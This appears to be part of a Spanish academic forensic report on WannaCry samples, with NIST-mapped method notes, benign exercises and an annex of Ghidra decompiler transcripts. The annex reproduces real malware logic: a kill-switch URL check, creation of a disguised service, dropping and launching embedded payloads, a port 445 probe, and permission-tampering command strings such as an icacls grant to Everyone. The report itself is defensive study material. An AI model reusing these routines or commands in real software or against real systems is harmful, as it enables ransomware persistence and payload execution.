### Solicitud de proceso: 1800010f8

La auxiliar inicializa estructuras y solicita CreateProcessA con la ruta global. Si la API informa éxito, cierra los handles del hilo y del proceso. Retorna cero en ambos caminos. No hay espera del hijo en esta rutina.

Cerrar handles libera referencias de la función; no prueba que el proceso terminara. La devolución cero tampoco demuestra fallo de CreateProcessA, porque ambos resultados de esa API terminan en ese mismo valor. La conclusión estática es «existe una solicitud de lanzamiento condicionada por el entorno», no «se ejecutó el ransomware completo». [API3]

### Relación con las otras muestras y ANY.RUN

El PE delimitado desde W/101 tiene hash 93db4b26be3a4e6b724bf85830746f458cde613ad88501bcb23d2ae1ab9976c9. No coincide con 24d004…. La relación probada es ec1383… → recurso W/101 → ese PE. No se añade una flecha de identidad hacia 24d004…, ni se deduce procedencia Dionaea o uso de DoublePulsar a partir de la estructura de una DLL.

El usuario informó que ANY.RUN mostró un error 500 en su página. No hay informe de tarea disponible para verificar hash ejecutado, invocación de exportación, procesos o tiempos. Ese dato comunicado no determina si la DLL hizo algo y no demuestra que un servidor de kill switch la detuviera.

### Criterios de revisión

La revisión debe verificar formato real, orden de llamadas, aritmética de +4, longitud, identidad del PE y retornos. Para ampliar harían falta inicialización del handle de módulo, referencias a PlayGame y contexto de invocación, manteniendo separada la procedencia externa. RS.AN-03 organiza la explicación causal; RS.AN-07 exige identidad y procedencia; RS.AN-06 exige registrar qué revisión se hizo realmente.

**Conclusión del componente:** ec1383… aporta un mecanismo de depósito y solicitud de lanzamiento de otra carga. Es útil para explicar arquitectura y límites de interpretación, pero su pertenencia a una cadena concreta de infección del NHS permanece no demostrada.


## 10. Correlación de hallazgos con artefactos de un sistema

Los artefactos de la tabla son **fuentes que se necesitarían**, no objetos adquiridos del NHS ni resultados generados en esta práctica. Su presencia depende de configuración, versión, retención y acciones previas. Una coincidencia nominal es una pista; la correlación debe sostener identidad y secuencia.

| Capacidad observada | Fuente que podría corroborarla | Qué habría que comprobar |
|---|---|---|
| Solicitud de servicio | Registro System, evento 7045; clave de servicio | Host, hora, ruta, ejecutable y proceso asociado |
| Solicitud de proceso | Auditoría de creación de procesos; telemetría existente | Relación padre-hijo, comando, token y tiempos |
| Escritura de componente | Archivo, metadatos y registro de actividad | Hash, ubicación y relación con el proceso |
| Acceso de red | Captura o registros DNS/firewall/proxy disponibles | Destino, tiempo y host; no solo puerto |
| Acción contra recuperación | Procesos y estado de copias antes/después | Operación realmente terminada y efecto comprobado |
| Cifrado | Archivos afectados y comparación con referencia | Contenido, extensión, proceso y secuencia; no solo nombre |

No se equipara un evento de autenticación de red con RDP sin más datos. Un timestamp de compilación tampoco determina la fecha de infección; puede no ser fiable. Una línea temporal debe conservar zona horaria, precisión, desfase conocido y fuente de cada hora. [NIST SP 800-86, §§4–6]

### 10.1 Ficha modelo ya completada con un hallazgo estático

| Campo | Contenido |
|---|---|
| Pregunta | ¿La rutina W/101 descifra el recurso? |
| Objeto | ec1383…, SHA-256 completo en sección 3 |
| Localizador | 180001014; instrucciones 18000108b y 1800010c4–1800010d3 |
| Observación | Lectura de DWORD inicial y WriteFile desde recurso+4 |
| Procedimiento | Cotejo de transcripción con Listing preservado y límites del recurso |
| Resultado | El tramo delimitado corresponde al PE 93db4b26… |
| Interpretación | La rutina seleccionada copia un tramo; no se observa descifrado en ella |
| Límite | No establece cómo se invocó PlayGame ni que la escritura ocurriera |
| NIST | RS.AN-03 y RS.AN-07; método SP 800-86 |

Una nueva ficha debe identificar a quien hizo realmente la comprobación. Este ejemplo expone un razonamiento documentado; no acredita una revisión individual nueva por cada autor.

## 11. Prácticas benignas para ampliar el estudio

### 11.1 Ejercicio de decisiones, sin ejecución del malware

Construir una tabla en papel con entradas hipotéticas: handle nulo/no nulo, recurso disponible/ausente, creación de archivo válida/inválida y creación de proceso válida/inválida. Recorrer los diagramas y anotar únicamente la salida del código. Etiquetar todas las entradas como S. El ejercicio se aprueba si se distinguen el retorno de la función, el resultado de la API y el efecto externo desconocido.

Respuestas de control: un handle no nulo evita la llamada 00408090; en W/101, después de pasar los controles iniciales, un fallo de CreateFileA puede llegar al retorno 1; en 1800010f8 tanto la ruta de éxito de CreateProcessA como la de fallo llegan a retorno 0. Ninguna respuesta implica que el malware se ejecutó.

### 11.2 Ejercicio de integridad y restauración de documentos ficticios

En una sesión futura de Windows verificada, crear una carpeta nueva de práctica con un texto que diga «dato ficticio de clase». Registrar su SHA-256 con Get-FileHash, conservar una copia separada y modificar manualmente solo el documento de trabajo. Comparar hashes, restaurar desde la copia y comprobar tanto la igualdad como la lectura del contenido. No utilizar documentos personales, muestras ni órdenes del malware.

El registro debe incluir fecha, acción, objeto, hash anterior/posterior, copia utilizada y resultado real. Restaurar un texto verifica esa operación limitada. No demuestra recuperación frente a WannaCry, limpieza de un respaldo ni restablecimiento de un servicio hospitalario. Relación NIST: PR.DS-11, RC.RP-03 y RC.RP-05.

### 11.3 Ejercicio de observación de proceso benigno

En la estación verificada, observar una aplicación inocua como el editor de texto con una herramienta disponible y validada. Anotar proceso, apertura y cierre reales. Si la auditoría o la herramienta no conserva un dato, registrar esa ausencia y su causa conocida; no inventar un evento. El objetivo es aprender la diferencia entre presencia de archivo, creación de proceso y operación terminada.

No se afirma que estos ejercicios ya se realizaron. Tampoco se generan conexiones de red o muestras artificialmente dañinas para rellenar una tabla. El ejercicio de mesa puede realizarse sin Windows; las observaciones del invitado requieren una sesión real y documentada.

## 12. Cómo ampliar el análisis de las demás funciones

### 12.1 Inventario antes de conclusiones

Exportar un listado de funciones del programa autorizado, conservando nombre, dirección, tamaño, llamadas y referencias. Clasificar cada entrada solo después de examinarla: inicialización, biblioteca, datos, recursos, interfaz, red, procesos, criptografía o sin resolver. Registrar el criterio y su confianza. La plantilla anterior de inventario está vacía y no se presenta como trabajo ya completado.

### 12.2 Prioridades concretas

| Componente | Próxima pregunta estática | Condición para cerrarla |
|---|---|---|
| 24d004… | ¿Qué caminos siguen al dispatcher y a las rutinas de red? | Grafo de llamadas contrastado y condiciones documentadas |
| ed01… | ¿Qué hacen los auxiliares previos a TaskStart? | Tipos revisados, entradas/salidas y fronteras de carga comprobadas |
| u.wnry | ¿Cuál es el límite correcto del bloque llamador? | Referencias y flujo de instrucciones revisados sin inventar C |
| ec1383… | ¿Cómo se inicializa el módulo y quién llama a la exportación? | Callers e inicialización sustentados; procedencia externa separada |

Una función grande puede contener bibliotecas o interfaz y no ser el mecanismo principal. Una función pequeña puede tomar una decisión decisiva. La prioridad se justifica por la pregunta del caso, no por el número de líneas. No debe renombrarse una función como «cifrador» antes de demostrar qué transforma y cómo se relaciona con la carga.

## 13. Revisión colectiva y defensa

Los ocho autores pueden revisar por pares de manera rotativa, eligiendo un componente y una fuente histórica. Esta es una propuesta de trabajo, no una asignación nominal ni constancia de tareas realizadas. La revisión debe producir comentarios verificables y correcciones, sin reconstruir retrospectivamente firmas.

| Pregunta de defensa | Respuesta sustentada |
|---|---|
| ¿Los cuatro archivos son iguales? | No. Hay relaciones de contención y componentes distintos; ec1383… contiene otro PE |
| ¿Qué es W/101? | Tipo e identificador de recurso; el PE delimitado empieza cuatro bytes después |
| ¿HTTP 500 detuvo la muestra? | El 500 fue comunicado sobre la página ANY.RUN; no hay informe para concluirlo |
| ¿Ghidra muestra el código original? | Produce desensamblado y una aproximación de alto nivel, con tipos y nombres inferidos |
| ¿Se analizó todo WannaCry? | Se examinaron mecanismos seleccionados; 16 transcripciones no cubren 1.755 funciones |
| ¿Qué aporta NIST? | Método y resultados verificables de gestión; no añade evidencia ni certificación |
| ¿La VM demuestra lo ocurrido en 2017? | No; sirve para lectura y ejercicios benignos con resultados propios |

La exposición puede seguir este orden: identidad de los objetos, mapa de contenido, una decisión de cada componente, relación documental con el NHS, resultados NIST y límites. El detalle de código debe explicar una afirmación concreta; no es necesario leer en voz alta cada inicialización automática.

## 14. Conclusión práctica

La práctica permite justificar relaciones entre contenedores y cargas, interpretar decisiones de funciones y distinguir solicitudes de operaciones de efectos observados. El análisis más importante no es afirmar que una muestra «hace todo», sino indicar qué condición conduce a cada acción prevista y qué prueba sería necesaria para demostrarla en un equipo.

La documentación queda preparada para nuevas sesiones con el mismo criterio de trazabilidad. Cada ampliación deberá conservar versión, hash, dirección, resultado y límite. Los capítulos siguientes incluyen las transcripciones para estudiar sin abrir muestras; no constituyen una reconstrucción compilable ni instrucciones para lanzar ransomware.

## Referencias de la parte práctica

[NIST SP 800-86] Kent, K., Chevalier, S., Grance, T., y Dang, H. (2006). *Guide to integrating forensic techniques into incident response*. [DOI](https://doi.org/10.6028/NIST.SP.800-86). Capítulo 3 para el método; capítulos 4–6 para fuentes y examen.

[NIST CSF 2.0] National Institute of Standards and Technology. (2024). *The NIST Cybersecurity Framework (CSF) 2.0*. [DOI](https://doi.org/10.6028/NIST.CSWP.29). Códigos del apéndice A. Contexto histórico y restantes referencias en el informe general.

[API1] Microsoft. (s. f.). *InternetOpenUrlA*. [Documentación oficial](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla). Consulta: 20/11/2026.

[API2] Microsoft. (s. f.). *FindResourceA*. [Documentación oficial](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea). Tipo, identificador y retorno; consulta: 20/11/2026.

[API3] Microsoft. (s. f.). *CreateProcessA*. [Documentación oficial](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa). Creación y límites de finalización; consulta: 20/11/2026.

[API4] Microsoft. (s. f.). *CheckTokenMembership*. [Documentación oficial](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership). Retorno y parámetro de salida; consulta: 20/11/2026.

[REGISTROS LOCALES] Proyecto académico. (2026, 15 de noviembre). *Exportaciones Ghidra, Listing y manifiestos de extracción*. Referencias y SHA-256 en `trazabilidad.json`. Edición de transcripciones original cotejada por `scripts/verificar_material_equipo.py`. No se atribuyen estos archivos a un hospital.

## Anexo: transcripciones seleccionadas del Decompiler

Los 16 cuerpos siguientes se incorporan desde la edición conservada y se cotejan por SHA-256. Se preservan instrucciones, nombres y comentarios; solo la presentación impresa puede envolver líneas. Los nombres en español y comentarios del analista no son símbolos originales. Los prototipos imperfectos se conservan deliberadamente; las precisiones se explican en cada capítulo.

### 24d004… · 00408140

Nombre en exportación: Comprobar_KillSwitch-00408140.

```c
/* MCP 2026-11-15: compara con NULL el handle de InternetOpenUrlA. La rama NULL llama 00408090. No
   verifica explícitamente HTTP 200. Confirmado con ensamblado; no es observación de una
   ejecución ni evidencia del NHS. */

undefined4 Comprobar_KillSwitch(void)

{
  void *session;
  void *handle;
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  char local_50 [57];
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined4 local_7;
  undefined2 local_3;
  undefined1 local_1;

  pcVar2 = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
  pcVar3 = local_50;
  for (iVar1 = 0xe; iVar1 != 0; iVar1 = iVar1 + -1) {
    *(undefined4 *)pcVar3 = *(undefined4 *)pcVar2;
    pcVar2 = pcVar2 + 4;
    pcVar3 = pcVar3 + 4;
  }
  *pcVar3 = *pcVar2;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_3 = 0;
  local_1 = 0;
  session = InternetOpenA((char *)0x0,1,(char *)0x0,(char *)0x0,0);
  handle = InternetOpenUrlA(session,local_50,(char *)0x0,0,0x84000000,0);
  if (handle == (void *)0x0) {
    InternetCloseHandle(session);
    InternetCloseHandle((void *)0x0);
    Preparar_Servicio_Y_Carga();
    return 0;
  }
  InternetCloseHandle(session);
  InternetCloseHandle(handle);
  return 0;
}
```

### 24d004… · 00408090

Nombre en exportación: Preparar_Servicio_Y_Carga-00408090.

```c
/* Distribuye las ramas según argumentos. Nombre descriptivo del analista, no símbolo original. */

void Preparar_Servicio_Y_Carga(void)

{
  int *piVar1;
  SC_HANDLE hSCManager;
  SC_HANDLE hSCObject;
  SERVICE_TABLE_ENTRYA SStack_10;
  undefined4 uStack_8;
  undefined4 uStack_4;

  GetModuleFileNameA((HMODULE)0x0,&DAT_0070f760,0x104);
  piVar1 = (int *)__p___argc();
  if (*piVar1 < 2) {
    FUN_00407f20();
    return;
  }
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager != (SC_HANDLE)0x0) {
    hSCObject = OpenServiceA(hSCManager,s_mssecsvc2_0_004312fc,0xf01ff);
    if (hSCObject != (SC_HANDLE)0x0) {
      FUN_00407fa0(hSCObject,0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServiceHandle(hSCManager);
  }
  SStack_10.lpServiceName = s_mssecsvc2_0_004312fc;
  SStack_10.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
  uStack_8 = 0;
  uStack_4 = 0;
  StartServiceCtrlDispatcherA(&SStack_10);
  return;
}
```

### 24d004… · 00407f20

Nombre en exportación: FUN_00407f20-00407f20.

```c
undefined4 FUN_00407f20(void)

{
  Crear_Servicio_mssecsvc();
  Extraer_Recurso_R_1831();
  return 0;
}
```

### 24d004… · 00407c40

Nombre en exportación: Crear_Servicio_mssecsvc-00407c40.

```c
/* CreateServiceA: mssecsvc2.0, argumento -m security, inicio 2. Comportamiento inferido
   estáticamente; no se generó un evento 7045. */

undefined4 Crear_Servicio_mssecsvc(void)

{
  SC_HANDLE hSCManager;
  SC_HANDLE hService;
  char local_104 [260];

  sprintf(local_104,s__s__m_security_00431330,&DAT_0070f760);
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager == (SC_HANDLE)0x0) {
    return 0;
  }
  hService = CreateServiceA(hSCManager,s_mssecsvc2_0_004312fc,
                            s_Microsoft_Security_Center__2_0__S_00431308,0xf01ff,0x10,2,1,local_104,
                            (LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0);
  if (hService != (SC_HANDLE)0x0) {
    StartServiceA(hService,0,(LPCSTR *)0x0);
    CloseServiceHandle(hService);
  }
  CloseServiceHandle(hSCManager);
  return 0;
}
```

### 24d004… · 00407ce0

Nombre en exportación: Extraer_Recurso_R_1831-00407ce0.

```c
/* FindResourceA ID 0x727, tipo R. El recurso extraído coincide byte a byte por SHA-256 con
   ed01ebfb...; original conservado. */

undefined4 Extraer_Recurso_R_1831(void)

{
  char cVar1;
  HMODULE hModule;
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar2;
  DWORD DVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  undefined4 *puVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 uVar11;
  undefined4 uStack_290;
  char *pcStack_28c;
  undefined4 uStack_288;
  undefined4 uStack_284;
  undefined4 uVar12;
  char acStack_23c [52];
  char local_208;
  undefined4 local_207;
  char local_104;
  undefined4 local_103;

  hModule = GetModuleHandleW(u_kernel32_dll_004313b4);
  if (hModule != (HMODULE)0x0) {
    DAT_00431478 = GetProcAddress(hModule,s_CreateProcessA_004313a4);
    DAT_00431458 = GetProcAddress(hModule,s_CreateFileA_00431398);
    DAT_00431460 = GetProcAddress(hModule,s_WriteFile_0043138c);
    DAT_0043144c = GetProcAddress(hModule,s_CloseHandle_00431380);
    if ((((DAT_00431478 != (FARPROC)0x0) && (DAT_00431458 != (FARPROC)0x0)) &&
        (DAT_00431460 != (FARPROC)0x0)) && (DAT_0043144c != (FARPROC)0x0)) {
      hResInfo = FindResourceA((HMODULE)0x0,(LPCSTR)0x727,&DAT_0043137c);
      if (hResInfo != (HRSRC)0x0) {
        hResData = LoadResource((HMODULE)0x0,hResInfo);
        if (hResData != (HGLOBAL)0x0) {
          pvVar2 = LockResource(hResData);
          if (pvVar2 != (LPVOID)0x0) {
            DVar3 = SizeofResource((HMODULE)0x0,hResInfo);
            if (DVar3 != 0) {
              local_208 = '\0';
              puVar8 = &local_207;
              for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
                *puVar8 = 0;
                puVar8 = puVar8 + 1;
              }
              *(undefined2 *)puVar8 = 0;
              *(undefined1 *)((int)puVar8 + 2) = 0;
              local_104 = '\0';
              puVar8 = &local_103;
              for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
                *puVar8 = 0;
                puVar8 = puVar8 + 1;
              }
              *(undefined2 *)puVar8 = 0;
              *(undefined1 *)((int)puVar8 + 2) = 0;
              uStack_284 = 0x407e03;
              sprintf(&local_208,s_C___s__s_00431358);
              sprintf(&local_104,s_C___s_qeriuwjhrf_00431344);
              MoveFileExA(&local_208,&local_104,1);
              uVar12 = 2;
              uStack_284 = 0;
              pcStack_28c = &local_208;
              uStack_288 = 0x40000000;
              uStack_290 = 0x407e49;
              iVar4 = (*DAT_00431458)();
              if (iVar4 != -1) {
                uStack_290 = 0;
                (*DAT_00431460)(iVar4,uVar12,DVar3,acStack_23c + -0x40);
                (*DAT_0043144c)(iVar4);
                pcStack_28c = (char *)0x0;
                uStack_288 = 0;
                uStack_284 = 0;
                pcVar7 = acStack_23c + -0x40;
                for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
                  pcVar7[0] = '\0';
                  pcVar7[1] = '\0';
                  pcVar7[2] = '\0';
                  pcVar7[3] = '\0';
                  pcVar7 = pcVar7 + 4;
                }
                uVar5 = 0xffffffff;
                pcVar7 = (char *)&DAT_00431340;
                do {
                  pcVar10 = pcVar7;
                  if (uVar5 == 0) break;
                  uVar5 = uVar5 - 1;
                  pcVar10 = pcVar7 + 1;
                  cVar1 = *pcVar7;
                  pcVar7 = pcVar10;
                } while (cVar1 != '\0');
                uVar5 = ~uVar5;
                uStack_290 = 0;
                iVar4 = -1;
                pcVar7 = acStack_23c;
                do {
                  pcVar9 = pcVar7;
                  if (iVar4 == 0) break;
                  iVar4 = iVar4 + -1;
                  pcVar9 = pcVar7 + 1;
                  cVar1 = *pcVar7;
                  pcVar7 = pcVar9;
                } while (cVar1 != '\0');
                pcVar7 = pcVar10 + -uVar5;
                pcVar10 = pcVar9 + -1;
                for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
                  *(undefined4 *)pcVar10 = *(undefined4 *)pcVar7;
                  pcVar7 = pcVar7 + 4;
                  pcVar10 = pcVar10 + 4;
                }
                for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
                  *pcVar10 = *pcVar7;
                  pcVar7 = pcVar7 + 1;
                  pcVar10 = pcVar10 + 1;
                }
                uVar11 = 0;
                uVar12 = 0;
                iVar4 = (*DAT_00431478)(0,acStack_23c,0,0,0,0x8000000,0,0,acStack_23c + -0x44,
                                        &uStack_290);
                if (iVar4 != 0) {
                  (*DAT_0043144c)(uVar11);
                  (*DAT_0043144c)(uVar12);
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
```

### 24d004… · 00407480

Nombre en exportación: Comprobar_Conexion_445-00407480.

```c
/* Constante 0x1bd y llamadas WS2_32 por ordinal. No se realizó tráfico SMB. */

undefined4 Comprobar_Conexion_445(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined2 *puStack_13c;
  undefined4 uStack_138;
  undefined4 uStack_134;
  undefined4 uStack_130;
  undefined4 uStack_12c;
  undefined2 local_120;
  undefined2 local_11e;
  undefined2 uStack_11c;
  undefined2 local_11a;
  undefined2 uStack_118;
  undefined4 local_116;
  undefined2 local_112;
  undefined4 local_110;

  local_11e = 0;
  uStack_118 = 0;
  local_116 = 0;
  uStack_12c = 0x1bd;
  local_112 = 0;
  local_110 = 1;
  uStack_11c = (undefined2)param_1;
  local_11a = (undefined2)((uint)param_1 >> 0x10);
  local_120 = 2;
  uStack_130 = 0x4074c0;
  Ordinal_9();
  uStack_130 = 6;
  uStack_134 = 1;
  uStack_138 = 2;
  puStack_13c = (undefined2 *)0x4074cf;
  iVar1 = Ordinal_23();
  if (iVar1 == -1) {
    return 0;
  }
  puStack_13c = &local_120;
  Ordinal_10(iVar1,0x8004667e);
  uStack_11c = (undefined2)iVar1;
  local_11a = (undefined2)((uint)iVar1 >> 0x10);
  local_120 = 1;
  local_11e = 0;
  Ordinal_4(iVar1,&puStack_13c,0x10);
  uVar2 = Ordinal_18(0,0,&uStack_12c,0,&uStack_134);
  Ordinal_3(iVar1);
  return uVar2;
}
```

### ed01… · 00401dab

Nombre en exportación: Extraer_Paquete_XIA_2058-00401dab.

```c
/* Recurso XIA, ID 0x80a. Extracción estática del ZIP validada por CRC y hashes en manifiesto
   local. */

undefined4 Extraer_Paquete_XIA_2058(HMODULE param_1,undefined4 param_2)

{
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar1;
  DWORD DVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  int iVar7;
  int local_130;
  char local_12c [296];

  hResInfo = FindResourceA(param_1,(LPCSTR)0x80a,&DAT_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
    DVar2 = SizeofResource(param_1,hResInfo);
    iVar3 = FUN_004075ad(pvVar1,DVar2,param_2);
    if (iVar3 != 0) {
      local_130 = 0;
      pcVar6 = local_12c;
      for (iVar5 = 0x4a; iVar5 != 0; iVar5 = iVar5 + -1) {
        pcVar6[0] = '\0';
        pcVar6[1] = '\0';
        pcVar6[2] = '\0';
        pcVar6[3] = '\0';
        pcVar6 = pcVar6 + 4;
      }
      FUN_004075c4(iVar3,0xffffffff,&local_130);
      iVar5 = local_130;
      iVar7 = 0;
      if (0 < local_130) {
        do {
          FUN_004075c4(iVar3,iVar7,&local_130);
          iVar4 = strcmp(local_12c,s_c_wnry_0040e010);
          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA(local_12c), DVar2 == 0xffffffff)) {
            FUN_0040763d(iVar3,iVar7,local_12c);
          }
          iVar7 = iVar7 + 1;
        } while (iVar7 < iVar5);
      }
      FUN_00407656(iVar3);
      return 1;
    }
  }
  return 0;
}
```

### ed01… · 00401fe7

Nombre en exportación: Preparar_Paquete_Y_Permisos-00401fe7.

```c
/* Referencias a contraseña interna y comando icacls. No equivale a una captura de ejecución. */

undefined4 Preparar_Paquete_Y_Permisos(void)

{
  int *piVar1;
  DWORD DVar2;
  code *pcVar3;
  int iVar4;
  undefined4 *puVar5;
  char *pcVar6;
  CHAR local_210;
  undefined4 local_20f;
  undefined4 local_8;

  local_210 = DAT_0040f910;
  puVar5 = &local_20f;
  for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined1 *)((int)puVar5 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,&local_210,0x208);
  FUN_00401225(&DAT_0040f8ac);
  piVar1 = (int *)__p___argc();
  if (*piVar1 == 2) {
    pcVar6 = &DAT_0040f538;
    piVar1 = (int *)__p___argv();
    iVar4 = strcmp(*(char **)(*piVar1 + 4),pcVar6);
    if ((iVar4 == 0) && (iVar4 = FUN_00401b5f(0), iVar4 != 0)) {
      CopyFileA(&local_210,s_tasksche_exe_0040f4d8,0);
      DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
      if ((DVar2 != 0xffffffff) && (iVar4 = FUN_00401f5d(), iVar4 != 0)) {
        return 0;
      }
    }
  }
  pcVar6 = strrchr(&local_210,0x5c);
  if (pcVar6 != (char *)0x0) {
    pcVar6 = strrchr(&local_210,0x5c);
    *pcVar6 = '\0';
  }
  SetCurrentDirectoryA(&local_210);
  FUN_004010fd(1);
  Extraer_Paquete_XIA_2058(0,s_WNcry_2ol7_0040f52c);
  FUN_00401e9e();
  FUN_00401064(s_attrib__h___0040f520,0,0);
  FUN_00401064(s_icacls____grant_Everyone_F__T__C_0040f4fc,0,0);
  iVar4 = FUN_0040170a();
  if (iVar4 != 0) {
    FUN_004012fd();
    iVar4 = FUN_00401437(0,0,0);
    if (iVar4 != 0) {
      local_8 = 0;
      iVar4 = FUN_004014a6(s_t_wnry_0040f4f4,&local_8);
      if (((iVar4 != 0) && (iVar4 = FUN_004021bd(iVar4,local_8), iVar4 != 0)) &&
         (pcVar3 = (code *)FUN_00402924(iVar4,s_TaskStart_0040f4e8), pcVar3 != (code *)0x0)) {
        (*pcVar3)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}
```

### ed01… · 00401064

Nombre en exportación: FUN_00401064-00401064.

```c
undefined4 FUN_00401064(LPSTR param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  int iVar4;
  LPSTR *ppCVar5;
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;

  local_58.cb = 0x44;
  ppCVar5 = &local_58.lpReserved;
  for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
    *ppCVar5 = (LPSTR)0x0;
    ppCVar5 = ppCVar5 + 1;
  }
  local_14.hProcess = (HANDLE)0x0;
  local_14.hThread = (HANDLE)0x0;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar3 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 == 0) {
    uVar3 = 0;
  }
  else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_14.hProcess,param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar3;
}
```

### ed01… · 004014a6

Nombre en exportación: FUN_004014a6-004014a6.

```c
HGLOBAL __thiscall FUN_004014a6(int param_1,LPCSTR param_2,uint *param_3)

{
  HGLOBAL pvVar1;
  HANDLE hFile;
  int iVar2;
  HGLOBAL pvVar3;
  int local_248 [2];
  undefined1 local_240;
  undefined4 local_23f;
  undefined2 uStack_23b;
  undefined1 uStack_239;
  uint local_238;
  uint local_234;
  undefined1 local_230 [512];
  undefined4 local_30;
  HGLOBAL local_2c;
  LARGE_INTEGER local_28;
  uint local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;

  puStack_c = &DAT_004081e0;
  puStack_10 = &DAT_004076f4;
  local_14 = ExceptionList;
  pvVar3 = (HGLOBAL)0x0;
  local_30 = 0;
  local_248[0] = 0;
  local_240 = 0;
  local_23f = 0;
  uStack_23b = 0;
  uStack_239 = 0;
  local_248[1] = 0;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_2,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,&local_28);
    if ((local_28.s.HighPart < 1) && ((local_28.s.HighPart < 0 || (local_28.s.LowPart < 0x6400001)))
       ) {
      iVar2 = (*DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248[0] == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*DAT_0040f880)(hFile,local_248 + 1,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1(*(undefined4 *)(param_1 + 0x4c8),local_248[0],local_230,
                                       &local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76(local_230,PTR_DAT_0040f578,local_30,0x10);
                    local_2c = GlobalAlloc(0,local_238);
                    if (local_2c != (HGLOBAL)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1 + 0x4c8),
                                              local_28.s.LowPart,local_20,0);
                      pvVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77(*(undefined4 *)(param_1 + 0x4c8),local_2c,local_20[0],1);
                        *param_3 = local_238;
                        pvVar3 = pvVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return pvVar3;
}
```

### u.wnry · 00401bb0

Nombre en exportación: FUN_00401bb0-00401bb0.

```c
undefined4 FUN_00401bb0(void)

{
  BOOL BVar1;
  BOOL local_10;
  PSID local_c;
  _SID_IDENTIFIER_AUTHORITY local_8;

  local_8.Value[0] = '\0';
  local_8.Value[1] = '\0';
  local_8.Value[2] = '\0';
  local_8.Value[3] = '\0';
  local_8.Value[4] = '\0';
  local_8.Value[5] = '\x05';
  local_10 = 0;
